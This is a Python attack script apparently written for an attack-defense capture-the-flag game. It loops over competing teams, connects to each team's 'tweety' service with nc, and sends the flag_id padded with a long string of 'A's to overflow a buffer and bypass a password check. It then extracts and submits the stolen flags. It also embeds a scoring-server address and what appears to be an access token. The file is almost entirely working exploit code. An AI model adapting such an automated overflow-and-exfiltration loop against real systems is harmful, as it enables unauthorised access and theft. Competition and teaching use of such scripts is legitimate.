# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'tweety' service
def name():
    return "steal-tweety-flags"

def help():
    return "Steal flags from the 'tweety' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    import swpag_client
    from threading import Timer

    # Retrieve the list of flag targets for this tick for service 5 (configuration)
    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    tweety_flags = t.get_targets(4)

    for target in tweety_flags:
        team = target['hostname']
        flag_id = target['flag_id']

        # Make sure we're not trying to hack ourselves or the test accounts
        if team in ["team9", "team11", "team12"]:
            print("Skipping {0}".format(team))
            continue

        try:
            print("Trying {0}...".format(team))

            # Spin up an nc process for the service and a timer. The timer is a
            # fallback mechanism to ensure the process doesn't hang if we get
            # into an unexpected situation.
            p = Popen(["nc", team, "10004"], stdout=PIPE, stdin=PIPE)
            tt = Timer(3, p.kill)
            tt.start()

            # Try to read input until we get to the prompt, then choose to read
            # a tweet ('R' command)
            p.stdout.readline().decode()
            p.stdout.readline().decode()
            p.stdout.readline().decode()
            p.stdin.write("R\n".encode())
            p.stdin.flush()

            # Read the next line of input to get to the second prompt, then send
            # a malicously crafted string that will trigger a buffer overflow and
            # effectively bypass the password check.
            p.stdout.readline().decode()
            p.stdin.write("{0} AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".format(flag_id).encode())
            p.stdin.flush()

            # Read the response and parse out the flag value
            out = p.stdout.readline().decode()
            m = out.replace("Note content: ", '')
            m.strip()
            m.replace('\n', ' ').replace('\r', '')

            # Send the flag to the scoring service, then cancel the timer since
            # we no longer need it.
            result = t.submit_flag([m[0:16]])
            tt.cancel()

            print("Submitting flag {0} for team {1}: {2}".format(m[0:16], team, result))
        except:
            import sys
            e = sys.exc_info()[0]
            print("Exception: {0}".format(e))